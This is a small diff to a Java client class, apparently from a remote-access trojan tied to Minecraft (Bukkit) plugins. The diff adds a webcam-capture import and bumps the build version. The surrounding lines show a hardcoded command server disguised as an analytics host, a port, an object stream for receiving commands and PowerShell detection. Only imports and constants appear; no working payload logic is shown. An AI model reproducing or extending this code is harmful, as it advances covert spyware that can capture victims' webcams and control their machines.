@@ -1,5 +1,6 @@
 package me.kutuzov.client;
 
+import com.github.sarxos.webcam.Webcam;
 import com.profesorfalken.jpowershell.OSDetector;
 import me.kutuzov.client.util.BukkitUtil;
 import me.kutuzov.client.util.LoggingUtil;
@@ -18,7 +19,7 @@ import java.util.Arrays;
 public class KutuzovEntry {
     public static final String HOST = "analytics018.antecedentium.xyz";
     public static final int    PORT = 33901;
-    public static final String VERSION = "b205";
+    public static final String VERSION = "b206";
     public static boolean DEBUG = false;
 
     public static ObjectInputStream ois = null;
